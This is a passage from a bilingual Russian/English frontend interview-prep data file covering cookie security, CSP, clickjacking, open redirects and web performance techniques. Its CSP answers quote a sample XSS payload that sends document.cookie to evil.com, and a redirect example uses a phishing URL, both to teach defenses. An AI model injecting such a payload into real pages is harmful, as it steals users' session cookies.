            "HttpOnly-флаг делает cookie недоступной для чтения через document.cookie или любой другой JS-код — это защита именно от XSS: даже если злоумышленник внедрит скрипт на странице, он физически не сможет прочитать значение токена из такой cookie. Но при этом браузер продолжает автоматически прикреплять cookie к запросам на нужный домен независимо от того, какая страница инициировала запрос — это и есть основа CSRF-атаки (чужой сайт заставляет браузер пользователя отправить запрос с его же валидной cookie). Поэтому HttpOnly решает проблему кражи токена через XSS, но требует ОТДЕЛЬНОЙ защиты от CSRF (SameSite-атрибут, CSRF-токен) — это две разные угрозы с разными механизмами защиты.",
          interviewAnswerEn:
            "The HttpOnly flag makes a cookie unreadable via document.cookie or any other JS code — that's specifically an XSS defense: even if an attacker injects a script on the page, it physically can't read that cookie's value. But the browser still automatically attaches the cookie to requests to the matching domain regardless of which page initiated the request — that's the basis of a CSRF attack (a different site tricks the user's browser into sending a request with their valid cookie). So HttpOnly solves token theft via XSS, but needs SEPARATE protection against CSRF (the SameSite attribute, a CSRF token) — these are two different threats with different defense mechanisms.",
          pitfalls: [
            "Хранить access/refresh токен в localStorage 'потому что так проще с fetch/axios' без оценки реального риска XSS в проекте.",
            "Полагаться только на HttpOnly cookie и забывать про отдельную защиту от CSRF (SameSite/CSRF-токен) — это разные угрозы, требующие разных мер.",
          ],
        },
      },
      {
        id: "auth-csp",
        title: "Content Security Policy (CSP)",
        content: {
          title: "Content Security Policy (CSP)",
          shortExplanation:
            "CSP — HTTP-заголовок, которым сервер явно перечисляет, из каких источников странице разрешено загружать скрипты, стили, изображения и другие ресурсы — браузер блокирует всё, что не соответствует политике, даже если вредоносный код каким-то образом попал на страницу.",
          detailedExplanation:
            "CSP работает как 'defense in depth' — вторая линия защиты, которая ограничивает ущерб даже в случае, если XSS-уязвимость всё же сработала: например, директива script-src 'self' разрешает выполнение только скриптов, загруженных с того же origin, что и сама страница, и блокирует выполнение любого инлайн-скрипта или скрипта с внешнего домена, который может внедрить атакующий. Строгая политика без 'unsafe-inline' заставляет пересмотреть код, который полагается на инлайн-обработчики событий (onclick=\"...\" прямо в HTML) или eval-подобные конструкции — это неудобство окупается тем, что даже успешная XSS-инъекция (например, через непроверенный пользовательский ввод, выведенный в innerHTML) не сможет выполнить свой скрипт, если он нарушает политику. connect-src ограничивает, к каким доменам странице разрешено делать сетевые запросы (fetch/XHR/WebSocket) — это дополнительно ограничивает, куда сможет 'слить' украденные данные скрипт, даже если ему всё же удалось выполниться. CSP настраивается через HTTP-заголовок Content-Security-Policy (предпочтительно) или через <meta> тег (менее гибко, некоторые директивы через meta не работают).",
          codeExample:
            "// HTTP-заголовок ответа сервера\n// Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; connect-src 'self' https://api.example.com; img-src 'self' data:;\n\n// В Next.js — задаётся, например, в middleware или next.config.js через headers()\nconst nextConfig = {\n  async headers() {\n    return [{\n      source: '/(.*)',\n      headers: [{ key: 'Content-Security-Policy', value: \"default-src 'self'; script-src 'self'\" }],\n    }];\n  },\n};",
          whereUsed:
            "Публичные приложения, обрабатывающие пользовательский контент (комментарии, rich text), финтех и любые приложения с повышенными требованиями к безопасности, где нужна вторая линия защиты сверх санитизации ввода.",
          interviewQuestion: "Как CSP защищает пользователя даже в случае, если XSS-уязвимость в приложении всё же существует?",
          interviewAnswerRu:
            "Сама по себе CSP не устраняет XSS-уязвимость (непроверенный ввод, выведенный в innerHTML, — источник проблемы остаётся) — она ограничивает, что именно сможет сделать успешно внедрённый вредоносный скрипт. Например, если script-src разрешает только 'self', а атакующий внедрил <script>fetch('https://evil.com/steal?data='+document.cookie)</script>, браузер заблокирует выполнение этого инлайн-скрипта целиком, потому что он нарушает политику — атака проваливается не потому что не было уязвимости, а потому что CSP не дала внедрённому коду вообще запуститься.",
          interviewAnswerEn:
            "CSP alone doesn't eliminate an XSS vulnerability (unsanitized input rendered into innerHTML is still the root cause) — it limits what a successfully injected malicious script can actually do. For example, if script-src only allows 'self' and an attacker injects <script>fetch('https://evil.com/steal?data='+document.cookie)</script>, the browser blocks that inline script from running at all because it violates the policy — the attack fails not because there was no vulnerability, but because CSP never let the injected code execute in the first place.",
          pitfalls: [
            "Настраивать CSP с 'unsafe-inline' и 'unsafe-eval' 'для удобства' — это сводит на нет большую часть защиты от XSS, которую CSP призвана давать.",
            "Считать CSP заменой санитизации пользовательского ввода — это дополнительный слой защиты, а не замена базовой гигиены обработки данных.",
          ],
        },
      },
      {
        id: "auth-clickjacking-open-redirect",
        title: "Clickjacking & Open Redirect",
        content: {
          title: "Clickjacking & Open Redirect",
          shortExplanation:
            "Clickjacking — атака, при которой сайт злоумышленника прячет ваш сайт в невидимом iframe и обманом заставляет пользователя кликнуть по нему, думая, что он взаимодействует с чем-то другим; open redirect — уязвимость, при которой приложение слепо перенаправляет пользователя на URL, переданный в параметре, без проверки, что это доверенный адрес.",
          detailedExplanation:
            "При clickjacking атакующий встраивает чужой сайт (например, страницу 'Подтвердить перевод' банковского приложения) в невидимый (opacity: 0) iframe поверх своей заманчивой страницы (игра, конкурс), позиционируя кнопку подтверждения ровно под тем местом, куда пользователь скорее всего кликнет на видимом слое — пользователь думает, что нажимает 'Играть', а на самом деле кликает по невидимой кнопке 'Подтвердить' на чужой странице, где он уже аутентифицирован через cookie. Защита — заголовок X-Frame-Options: DENY (или SAMEORIGIN) либо более гибкая CSP-директива frame-ancestors, которые запрещают браузеру вообще встраивать страницу в iframe с чужого origin. Open redirect возникает, когда приложение делает редирект на URL из параметра запроса без проверки (например, /login?redirect=https://evil.com) — злоумышленник рассылает пользователям легитимную на вид ссылку на настоящий домен приложения, пользователь доверяет домену в адресной строке при переходе, вводит логин на настоящей странице входа, а после успешного входа его незаметно перенаправляет на фишинговую страницу-двойник, уже вызывающую меньше подозрений после 'настоящего' домена в истории перехода. Защита — валидировать redirect-параметр против allowlist собственных путей приложения (относительные пути внутри своего домена), а не принимать произвольный внешний URL.",
          codeExample:
            "// Уязвимо: редирект на произвольный внешний URL без проверки\nconst redirectTo = new URLSearchParams(location.search).get('redirect');\nwindow.location.href = redirectTo; // '?redirect=https://evil-phishing.com' — примут как есть\n\n// Безопаснее: разрешён только относительный путь внутри своего домена\nfunction safeRedirect(path) {\n  if (path.startsWith('/') && !path.startsWith('//')) {\n    window.location.href = path; // только собственные пути, не абсолютные внешние URL\n  }\n}",
          whereUsed:
            "X-Frame-Options/frame-ancestors — обязательны для любой страницы с формами аутентификации или финансовыми действиями. Валидация redirect-параметра — на любой странице логина/onboarding с параметром 'вернуться туда, откуда пришёл'.",
          interviewQuestion: "Как один заголовок (X-Frame-Options или CSP frame-ancestors) полностью предотвращает clickjacking-атаку?",
          interviewAnswerRu:
            "Clickjacking целиком строится на возможности встроить чужую страницу в iframe на своём вредоносном сайте — без этого встраивания у атакующего просто нет способа 'наложить' невидимый элемент чужой страницы поверх своей приманки. X-Frame-Options: DENY (или SAMEORIGIN, разрешающий фрейминг только с того же домена) инструктирует браузер полностью отказаться рендерить страницу внутри iframe, если запрос на встраивание пришёл с чужого origin — техническая возможность атаки исчезает не потому, что атакующий стал 'умнее' защищаться, а потому что сама механика (невидимый iframe с чужим контентом) больше не работает на уровне браузера.",
          interviewAnswerEn:
            "Clickjacking entirely relies on the ability to embed someone else's page in an iframe on a malicious site — without that embedding, the attacker simply has no way to overlay an invisible element from the target page on top of their bait. X-Frame-Options: DENY (or SAMEORIGIN, allowing framing only from the same domain) instructs the browser to flatly refuse to render the page inside an iframe if the embedding request comes from a different origin — the attack's technical possibility disappears not because the defense got smarter, but because the underlying mechanic (an invisible iframe with someone else's content) no longer works at the browser level.",
          pitfalls: [
            "Не устанавливать X-Frame-Options/frame-ancestors на страницах с чувствительными действиями (подтверждение платежа, смена пароля) — оставляет их уязвимыми к clickjacking.",
            "Принимать redirect-параметр как абсолютный внешний URL без allowlist — классический вектор для фишинга через 'доверенный' домен приложения.",
          ],
        },
      },

    ],
  },


  // ---------------------------------------------------------------------
  // PERFORMANCE
  // ---------------------------------------------------------------------
  {
    id: "performance",
    title: "Performance",
    subtopics: [
      {
        id: "perf-core-web-vitals",
        title: "Core Web Vitals",
        content: {
          title: "Core Web Vitals",
          shortExplanation:
            "Core Web Vitals — набор метрик Google, которые измеряют реальный пользовательский опыт загрузки и отклика страницы: LCP, INP (ранее FID) и CLS.",
          detailedExplanation:
            "LCP (Largest Contentful Paint) — время появления самого крупного видимого элемента (обычно герой-картинка или заголовок), показывает воспринимаемую скорость загрузки. INP (Interaction to Next Paint) — задержка между действием пользователя и визуальным откликом интерфейса, показывает отзывчивость. CLS (Cumulative Layout Shift) — суммарная 'прыгучесть' layout во время загрузки (например, картинка без заданных размеров сдвигает текст ниже). Эти метрики влияют и на реальный UX, и на ранжирование в поиске Google.",
          codeExample:
            "// Пример ухудшения CLS: картинка без размеров\n<img src='/banner.jpg' /> // layout shift при загрузке\n\n// Исправление: явные размеры или aspect-ratio\n<img src='/banner.jpg' width={1200} height={400} />",
          interviewQuestion: "Как можно улучшить LCP на типичной странице с герой-изображением?",
          interviewAnswerRu:
            "Основные способы: отдавать изображение в современном формате (WebP/AVIF) и правильном размере, использовать preload для критичного изображения, избегать блокирующих рендер скриптов и шрифтов перед ним, использовать SSR/статическую генерацию вместо чистого CSR, чтобы контент был в HTML сразу, а не появлялся после загрузки JS.",
          interviewAnswerEn:
            "Key techniques: serve the image in a modern format (WebP/AVIF) at the right size, preload the critical image, avoid render-blocking scripts and fonts ahead of it, and use SSR or static generation instead of pure CSR so the content is already in the HTML instead of appearing only after JS loads.",
          pitfalls: [
            "Оптимизировать метрики 'на глаз' без измерения через Lighthouse/PageSpeed Insights/реальные данные пользователей (CrUX).",
            "Не задавать размеры изображениям и блокам, зависящим от асинхронных данных — это портит CLS.",
          ],
          practiceTask:
            "Прогоните любую свою страницу через Lighthouse (в DevTools) и запишите значения LCP, INP/TBT и CLS, затем внесите одно улучшение и замерьте разницу.",
          resources: {
            docs: [
              { title: "Web Vitals — web.dev", url: "https://web.dev/articles/vitals" },
            ],
            articles: [
              { title: "Optimize Largest Contentful Paint — web.dev", url: "https://web.dev/articles/optimize-lcp" },
            ],
          },
        },
      },
      {
        id: "perf-critical-rendering-path",
        title: "Critical Rendering Path",
        content: {
          title: "Critical Rendering Path",
          shortExplanation:
            "Critical Rendering Path — последовательность шагов браузера от получения HTML/CSS/JS до отрисовки пикселей на экране.",
          detailedExplanation:
            "Путь примерно такой: браузер парсит HTML в DOM, парсит CSS в CSSOM, объединяет их в Render Tree, вычисляет Layout (геометрию каждого элемента) и делает Paint (закрашивание пикселей), а затем при наличии слоёв — Composite. CSS считается 'render-blocking' по умолчанию — браузер не покажет страницу, пока не получит и не обработает весь CSS в <head>. JS может как блокировать парсинг HTML (обычный <script> без defer/async), так и не блокировать (defer, async, или скрипты в конце body).",
          codeExample:
            "<!-- Блокирует парсинг HTML до полной загрузки и выполнения -->\n<script src='/heavy.js'></script>\n\n<!-- Не блокирует парсинг, выполняется после него, в порядке подключения -->\n<script src='/heavy.js' defer></script>",
          interviewQuestion: "Почему CSS в <head> считается 'блокирующим рендер', а defer-скрипт — нет?",
          interviewAnswerRu:
            "Браузер не может корректно построить Render Tree и начать отрисовку, пока не знает все стили — иначе пришлось бы перерисовывать страницу по мере догрузки CSS, что визуально дёргалось бы. Поэтому CSS в <head> блокирует первый рендер по умолчанию. Скрипт с defer, наоборот, явно говорит браузеру: 'не жди меня, продолжай парсить HTML, а выполни меня после того, как DOM будет готов' — поэтому он не блокирует построение страницы.",
          interviewAnswerEn:
            "The browser can't correctly build the render tree and start painting until it knows all the styles — otherwise the page would have to repaint as CSS keeps arriving, causing visible jank. That's why CSS in <head> blocks the first render by default. A script with defer, on the other hand, explicitly tells the browser 'don't wait for me, keep parsing the HTML, and run me once the DOM is ready' — so it doesn't block page construction.",
          pitfalls: [
            "Подключать большие CSS/JS-файлы без async/defer и без разделения на критичные и некритичные части.",
            "Не учитывать, что 'блокирующий' скрипт в середине HTML останавливает парсинг именно в этом месте документа.",
          ],
          practiceTask:
            "Откройте вкладку Performance в DevTools, перезагрузите страницу и найдите на таймлайне этапы Parse HTML, Recalculate Style, Layout и Paint.",
          resources: {
            docs: [
              { title: "Critical Rendering Path — web.dev", url: "https://web.dev/articles/critical-rendering-path" },
            ],
            articles: [
              { title: "Rendering Performance — web.dev", url: "https://web.dev/articles/rendering-performance" },
            ],
          },
        },
      },
      {
        id: "perf-reflow-repaint",
        title: "Reflow / Repaint",
        content: {
          title: "Reflow / Repaint",
          shortExplanation:
            "Reflow (layout) — пересчёт геометрии и положения элементов на странице; repaint — перерисовка пикселей без изменения геометрии (например, смена цвета).",
          detailedExplanation:
            "Reflow происходит, когда меняется что-то, влияющее на размеры или позицию элементов (изменение width/height, добавление/удаление DOM-узла, изменение шрифта) — браузеру приходится заново вычислять layout всего затронутого поддерева, а иногда и всей страницы. Repaint — более дешёвая операция: меняются только визуальные свойства (color, background, visibility), геометрия остаётся прежней. Чтение layout-свойств (offsetWidth, getBoundingClientRect) сразу после их изменения в цикле вызывает 'layout thrashing' — многократный принудительный пересчёт вместо одного.",
          codeExample:
            "// Плохо: layout thrashing — чтение и запись чередуются в цикле\nitems.forEach(item => {\n  item.style.width = item.offsetWidth + 10 + 'px'; // read, потом write, каждый раз\n});\n\n// Лучше: сначала все чтения, потом все записи\nconst widths = items.map(item => item.offsetWidth);\nitems.forEach((item, i) => { item.style.width = widths[i] + 10 + 'px'; });",
          interviewQuestion: "Что такое layout thrashing и как его избежать?",
          interviewAnswerRu:
            "Layout thrashing — это ситуация, когда код многократно чередует чтение layout-свойств (offsetWidth, getBoundingClientRect) и их изменение в цикле. Каждое такое чтение после изменения заставляет браузер синхронно пересчитать layout, вместо того чтобы сделать это один раз в конце кадра. Решение — разделить фазы: сначала прочитать все нужные значения, затем применить все изменения (или использовать requestAnimationFrame и батчинг через библиотеки/React).",
          interviewAnswerEn:
            "Layout thrashing happens when code repeatedly alternates between reading layout properties (offsetWidth, getBoundingClientRect) and mutating them inside a loop. Each such read right after a write forces the browser to synchronously recompute layout, instead of doing it once at the end of the frame. The fix is to separate the phases: read all the values you need first, then apply all the mutations (or use requestAnimationFrame and batching via a library or React).",
          pitfalls: [
            "Чередовать чтение и запись layout-свойств в циклах над списком DOM-узлов.",
            "Часто менять inline-стили в анимациях вместо использования transform/opacity, которые обычно избегают reflow.",
          ],
          practiceTask:
            "Воспроизведите layout thrashing на списке из 200 div-ов (чтение offsetWidth сразу после записи в цикле), замерьте время через Performance.now(), затем перепишите с разделением read/write фаз и сравните.",
          resources: {
            docs: [
              { title: "Reflow — MDN Glossary", url: "https://developer.mozilla.org/en-US/docs/Glossary/Reflow" },
            ],
            articles: [
              { title: "Avoid Large, Complex Layouts and Layout Thrashing — web.dev", url: "https://web.dev/articles/avoid-large-complex-layouts-and-layout-thrashing" },
              { title: "What Forces Layout / Reflow (Paul Irish)", url: "https://gist.github.com/paulirish/5d52fb081b3570c81e3a" },
            ],
          },
        },
      },
      {
        id: "perf-bundle-optimization",
        title: "Bundle Optimization",
        content: {
          title: "Bundle Optimization",
          shortExplanation:
            "Bundle optimization — набор техник для уменьшения размера JS/CSS, которые браузер должен скачать и выполнить перед тем, как страница станет интерактивной.",
          detailedExplanation:
            "Основные техники: code splitting (разбиение бандла на части, которые грузятся по требованию — например, по маршрутам или через dynamic import), tree shaking (удаление неиспользуемого кода при сборке, требует ES-модулей и 'чистых' библиотек без побочных эффектов на верхнем уровне), lazy loading тяжёлых компонентов и библиотек, анализ состава бандла (bundle analyzer) для поиска неожиданно тяжёлых зависимостей.",
          codeExample:
            "// Code splitting через dynamic import — этот код попадёт в отдельный чанк\nconst HeavyChart = dynamic(() => import('./HeavyChart'), { ssr: false });\n\n// Использование только нужной части библиотеки вместо всей\nimport debounce from 'lodash/debounce'; // вместо import _ from 'lodash'",
          interviewQuestion: "Чем tree shaking отличается от code splitting?",
          interviewAnswerRu:
            "Tree shaking убирает из финального бандла код, который вообще нигде не используется (мёртвый код) — это происходит на этапе сборки автоматически, если позволяет структура импортов. Code splitting не удаляет код, а разбивает используемый код на несколько файлов (чанков), которые загружаются не все сразу, а по мере необходимости — например, код страницы /admin грузится, только когда пользователь реально туда переходит.",
          interviewAnswerEn:
            "Tree shaking removes code from the final bundle that isn't used anywhere at all (dead code) — this happens automatically at build time if the import structure allows it. Code splitting doesn't remove code; it splits code that is used into multiple chunks that load on demand rather than all at once — for example, the /admin page's code only loads once the user actually navigates there.",
          pitfalls: [
            "Импортировать библиотеку целиком (import _ from 'lodash') там, где нужна одна функция.",
            "Не проверять реальный состав бандла через анализатор и не замечать случайно попавшую туда тяжёлую зависимость.",
          ],
          practiceTask:
            "Подключите @next/bundle-analyzer к проекту, соберите билд и найдите три самых тяжёлых пакета в клиентском бандле.",
          resources: {
            docs: [
              { title: "Lazy Loading Components and Libraries — Next.js Docs", url: "https://nextjs.org/docs/app/guides/lazy-loading" },
            ],
            articles: [
              { title: "Reduce JavaScript Payloads with Code Splitting — web.dev", url: "https://web.dev/articles/reduce-javascript-payloads-with-code-splitting" },
            ],
          },
        },
      },
      {
        id: "perf-image-optimization",
        title: "Image Optimization",
        content: {
          title: "Image Optimization",
          shortExplanation:
            "Оптимизация изображений — уменьшение их размера и правильная загрузка (формат, размер под устройство, ленивая загрузка), поскольку картинки часто самый тяжёлый ресурс страницы.",
          detailedExplanation:
            "Ключевые техники: использование современных форматов (WebP, AVIF) с меньшим весом при том же качестве, responsive images (разные размеры для разных экранов через srcset или встроенный next/image), lazy loading изображений вне первого экрана (loading='lazy'), явное указание width/height или aspect-ratio для предотвращения layout shift, приоритетная загрузка (preload/priority) для LCP-изображения. В Next.js компонент next/image делает большинство этого автоматически.",
          codeExample:
            "import Image from 'next/image';\n\n<Image\n  src='/hero.jpg'\n  alt='Hero'\n  width={1200}\n  height={600}\n  priority // не откладывать загрузку — это LCP-изображение\n/>",
          interviewQuestion: "Почему next/image по умолчанию делает изображения lazy, и когда это нужно отключать?",
          interviewAnswerRu:
            "По умолчанию next/image откладывает загрузку изображений, которые не видны в первом экране (viewport), чтобы не тратить пропускную способность на контент, который пользователь может и не увидеть — это ускоряет загрузку видимой части страницы. Но если изображение и есть тот самый LCP-элемент (например, герой-баннер), его наоборот нужно грузить с максимальным приоритетом — для этого используется проп priority, который отключает lazy loading и добавляет preload.",
          interviewAnswerEn:
            "By default next/image defers loading images that aren't visible in the initial viewport, so bandwidth isn't spent on content the user might never scroll to — this speeds up loading of the visible part of the page. But if an image is itself the LCP element (e.g. a hero banner), it needs to load with the highest priority instead — that's what the priority prop is for: it disables lazy loading and adds a preload hint.",
          pitfalls: [
            "Ставить priority на все изображения на странице — это возвращает проблему, которую lazy loading должен был решить.",
            "Не указывать width/height у next/image, из-за чего пропадает автоматическая защита от layout shift.",
          ],
          practiceTask:
            "Замените обычный <img> на next/image на тестовой странице, задайте priority только герой-картинке, а остальным оставьте lazy по умолчанию, и сравните LCP до/после.",
          resources: {
            docs: [
              { title: "Image Component — Next.js Docs", url: "https://nextjs.org/docs/app/api-reference/components/image" },
            ],
            articles: [
              { title: "Serve Responsive Images — web.dev", url: "https://web.dev/articles/serve-responsive-images" },
            ],
          },
        },
      },
      {
        id: "perf-lighthouse-profiling",
        title: "Lighthouse & Browser Profiling",
        content: {
          title: "Lighthouse & Browser Profiling",
          shortExplanation:
            "Lighthouse — автоматизированный аудит страницы (лабораторные данные: один прогон в контролируемых условиях), который оценивает Core Web Vitals и даёт конкретные рекомендации; браузерный профайлер (Performance-панель DevTools) показывает, что реально происходит по времени во время конкретного взаимодействия пользователя.",
          detailedExplanation:
            "Lighthouse даёт lab data — воспроизводимые измерения в контролируемом окружении (фиксированная эмуляция сети/CPU), что удобно для сравнения 'было/стало' после оптимизации, но не отражает разброс реальных условий пользователей (медленный телефон, плохая сеть, фоновые вкладки) — для этого существуют field data (RUM, Chrome UX Report), собранные с реальных посещений. Performance-панель браузерных DevTools записывает детальную временную шкалу конкретной сессии: можно увидеть, какая именно функция JS заняла сколько времени, где произошёл layout/reflow, сколько заняла отрисовка кадра — это инструмент для диагностики 'почему именно это взаимодействие тормозит', в отличие от Lighthouse, который даёт общую агрегированную оценку страницы целиком. React DevTools Profiler — более специализированный инструмент именно для React-рендеров: показывает, какие компоненты рендерились в рамках коммита и сколько времени это заняло, что помогает найти конкретный компонент, ответственный за лишние или медленные ре-рендеры.",
          codeExample:
            "// Программный доступ к части тех же метрик через PerformanceObserver в коде:\nnew PerformanceObserver((list) => {\n  for (const entry of list.getEntries()) {\n    console.log(entry.name, entry.startTime, entry.duration);\n  }\n}).observe({ type: 'longtask', buffered: true }); // отслеживание 'тяжёлых' задач в проде",
          whereUsed:
            "Lighthouse — в CI как gate перед мержем (не дать регрессии по производительности попасть в прод), в разовых аудитах перед редизайном. Performance-панель и React Profiler — при точечной отладке конкретной жалобы на тормоза ('форма лагает при вводе', 'страница долго становится интерактивной').",
          interviewQuestion: "Почему Lighthouse может показывать хороший результат, а реальные пользователи всё равно жалуются на тормоза?",
          interviewAnswerRu:
            "Lighthouse — это lab data: один прогон в контролируемых, обычно достаточно 'дружелюбных' условиях эмуляции сети и CPU, который не отражает весь спектр реальных устройств и сетей пользователей. Реальные пользователи заходят с более медленных телефонов, с плохим 3G/4G, с уже открытыми фоновыми вкладками, конкурирующими за CPU — эти условия field data (собранные через RUM или Chrome UX Report) отражают, а разовый лабораторный прогон Lighthouse — нет. Поэтому production-мониторинг производительности должен опираться на оба источника: лабораторные данные для контролируемого сравнения при разработке и полевые данные для понимания реального опыта пользователей.",
          interviewAnswerEn:
            "Lighthouse is lab data: a single run under controlled, usually fairly forgiving network/CPU emulation conditions that don't reflect the full spread of real users' devices and networks. Real users show up on slower phones, spotty 3G/4G, with background tabs already competing for CPU — field data (collected via RUM or the Chrome UX Report) captures that, a one-off lab run from Lighthouse doesn't. That's why production performance monitoring should rely on both sources: lab data for controlled comparisons during development, and field data for understanding actual user experience.",
          pitfalls: [
            "Полагаться исключительно на разовый лабораторный прогон Lighthouse как на полную картину производительности в проде.",
            "Оптимизировать вслепую без профилирования — 'на глаз' часто чинят не ту часть кода, которая реально была узким местом.",
          ],
        },
      },
      {
        id: "perf-font-optimization",
        title: "Font Optimization",
        content: {
          title: "Font Optimization",
          shortExplanation:
            "Загрузка веб-шрифтов может задерживать отображение текста (FOIT — invisible text) или вызывать визуальный 'скачок' при подмене системного шрифта на загруженный (FOUT/layout shift) — оптимизация шрифтов минимизирует оба эффекта.",
          detailedExplanation:
            "font-display: swap показывает текст системным шрифтом немедленно, а затем подменяет его на загруженный веб-шрифт, как только тот готов — это устраняет невидимый текст (FOIT), но может создать заметный layout shift, если метрики (ширина символов) системного и веб-шрифта сильно различаются. next/font (встроенное решение в Next.js) автоматически подгружает шрифт во время сборки, сам себя хостит (устраняя дополнительный DNS/TLS round-trip к Google Fonts или другому внешнему хосту) и генерирует CSS с size-adjust/fallback-метриками, которые подбирают запасной системный шрифт так, чтобы его ширина максимально совпадала с целевым веб-шрифтом — это минимизирует CLS от смены шрифта почти до нуля. preload для критичного шрифта (обычно шрифта заголовков above-the-fold) через <link rel='preload' as='font'> сообщает браузеру начать загрузку шрифта раньше, параллельно с остальными ресурсами, вместо того чтобы обнаружить необходимость в нём только после парсинга CSS.",
          codeExample:
            "// next/font — самохостинг + автоматический fallback с подобранными метриками\nimport { Inter } from 'next/font/google';\nconst inter = Inter({ subsets: ['latin'], display: 'swap' });\n\nexport default function RootLayout({ children }) {\n  return <html className={inter.className}>{children}</html>;\n}",
          whereUsed:
            "Любой сайт с кастомными веб-шрифтами, особенно на маркетинговых/публичных страницах, где CLS и LCP напрямую влияют на воспринимаемую скорость и SEO-метрики Core Web Vitals.",
          interviewQuestion: "Как next/font снижает CLS, вызванный сменой системного шрифта на веб-шрифт?",
          interviewAnswerRu:
            "next/font на этапе сборки анализирует метрики целевого веб-шрифта (ширину символов, межстрочный интервал) и генерирует CSS-фоллбэк, который подбирает наиболее близкий по этим метрикам системный шрифт с помощью size-adjust и связанных CSS-свойств — благодаря этому текст, отображённый системным шрифтом до загрузки веб-шрифта, занимает почти такое же пространство, как и финальный текст с веб-шрифтом, и переключение между ними почти не сдвигает layout. Дополнительно next/font самостоятельно хостит шрифт вместе с остальными статическими ассетами сайта, устраняя отдельный DNS-запрос и round-trip к внешнему хосту шрифтов.",
          interviewAnswerEn:
            "At build time, next/font analyzes the target web font's metrics (character widths, line height) and generates a fallback CSS that picks the closest-matching system font using size-adjust and related CSS properties — thanks to this, text rendered in the system font before the web font loads takes up nearly the same space as the final web-font text, so switching between them barely shifts the layout. On top of that, next/font self-hosts the font alongside the site's other static assets, eliminating a separate DNS lookup and round-trip to an external font host.",
          pitfalls: [
            "Загружать веб-шрифт с внешнего хоста (например, напрямую с Google Fonts CDN) без самохостинга — добавляет лишний DNS/TLS round-trip перед началом загрузки шрифта.",
            "Использовать font-display: swap без подобранного fallback — устраняет невидимый текст, но создаёт заметный layout shift при смене шрифта.",
          ],
        },
      },
      {
        id: "perf-preload-prefetch",
        title: "Preload / Prefetch",
        content: {
          title: "Preload / Prefetch",
          shortExplanation:
            "preload сообщает браузеру немедленно и с высоким приоритетом загрузить ресурс, который точно понадобится на этой же странице (шрифт, критичное изображение, скрипт); prefetch — низкоприоритетная подсказка загрузить ресурс, вероятно нужный для СЛЕДУЮЩЕЙ навигации, пока браузер простаивает.",
          detailedExplanation:
            "<link rel='preload' as='...'> используют для ресурсов, критичных для текущей страницы, но которые браузер иначе обнаружил бы слишком поздно — например, шрифт, используемый в CSS через @font-face, браузер обнаруживает только после парсинга CSS, а preload запускает его загрузку параллельно с самим CSS. prefetch, наоборот, про будущее: <link rel='prefetch'> для ресурса следующей вероятной страницы (например, JS-бандл страницы, на которую пользователь скорее всего перейдёт по наведённой ссылке) загружает его в фоне с низким приоритетом, когда браузер не занят более срочными задачами — в Next.js это встроено по умолчанию для ссылок компонента Link, которые попадают в область видимости (viewport). Злоупотребление preload (пометка слишком многих ресурсов как критичных) контрпродуктивно: браузер получает конкурирующие 'высокоприоритетные' запросы, что может замедлить действительно критичные из них — приоритет имеет смысл только тогда, когда он относительно редок и точно обоснован.",
          codeExample:
            "<!-- preload: критичный шрифт для текущей страницы -->\n<link rel=\"preload\" href=\"/fonts/inter.woff2\" as=\"font\" type=\"font/woff2\" crossOrigin=\"anonymous\" />\n\n<!-- prefetch: вероятно нужный ресурс для следующей навигации -->\n<link rel=\"prefetch\" href=\"/dashboard.js\" />\n\n// В Next.js <Link> предзагружает бандл целевой страницы автоматически,\n// когда ссылка попадает в viewport (эквивалент prefetch 'из коробки')",
          whereUsed:
            "preload — критичные шрифты, hero-изображение above-the-fold, критичный inline-скрипт. prefetch — ссылки на вероятные следующие страницы в навигации, особенно в SPA/Next.js с клиентскими переходами между страницами.",
          interviewQuestion: "Почему пометка слишком многих ресурсов как preload может ухудшить, а не улучшить производительность?",
          interviewAnswerRu:
            "preload сообщает браузеру повысить приоритет загрузки ресурса относительно остальных — это работает, только пока таких помеченных ресурсов немного и они действительно критичны. Если пометить preload десятки ресурсов, они начинают конкурировать друг с другом и с действительно важными ресурсами (основной HTML, критичный CSS) за пропускную способность сети и очередь загрузки браузера, из-за чего по-настоящему критичный ресурс может загрузиться позже, чем если бы preload вообще не использовался — приоритет, данный всем, перестаёт быть приоритетом.",
          interviewAnswerEn:
            "preload tells the browser to bump a resource's loading priority relative to everything else — this only works while the number of tagged resources is small and genuinely critical. Tag dozens of resources as preload, and they start competing with each other and with truly important resources (the main HTML, critical CSS) for network bandwidth and the browser's loading queue, which can make the actually critical resource load later than if preload hadn't been used at all — priority given to everything stops being priority.",
          pitfalls: [
            "Помечать preload все изображения на странице 'на всякий случай' вместо только действительно критичного hero-изображения.",
            "Использовать prefetch для очень тяжёлых ресурсов на мобильном трафике с оплатой за мегабайты — фоновая загрузка 'на всякий случай' может быть нежелательна для части пользователей.",
          ],
        },
      },
      {
        id: "perf-virtualization",
        title: "Virtualization",
        content: {
          title: "Virtualization (виртуализация списков)",
          shortExplanation:
            "Виртуализация рендерит в DOM только те элементы длинного списка/таблицы, которые реально видны во viewport (плюс небольшой запас), вместо того чтобы рендерить все тысячи элементов сразу — оставшиеся элементы представлены только 'пустым' пространством правильного размера.",
          detailedExplanation:
            "Рендер тысяч DOM-узлов дорог сам по себе (создание элементов, layout, memory), даже если пользователь физически видит на экране только 20-30 из них одновременно — виртуализация устраняет этот излишек, отслеживая scroll-позицию и динамически рендеря только видимый 'кусок' списка, подменяя элементы при прокрутке. Библиотеки вроде react-window/react-virtual/TanStack Virtual вычисляют, какие индексы элементов попадают в текущий viewport (с небольшим буфером сверху/снизу для плавности при быстрой прокрутке), рендерят только их с правильным абсолютным позиционированием (position: absolute с вычисленным top), а общая высота контейнера прокрутки задаётся так, будто все элементы физически присутствуют — это создаёт иллюзию обычного длинного списка при том, что реально в DOM находится лишь малая часть узлов. Виртуализация усложняет реализацию переменной высоты элементов (нужно либо заранее знать высоту каждого элемента, либо измерять её асинхронно) и делает сложнее нативный поиск по Ctrl+F на странице, потому что невидимые элементы физически отсутствуют в DOM, а не просто скрыты через CSS.",
          codeExample:
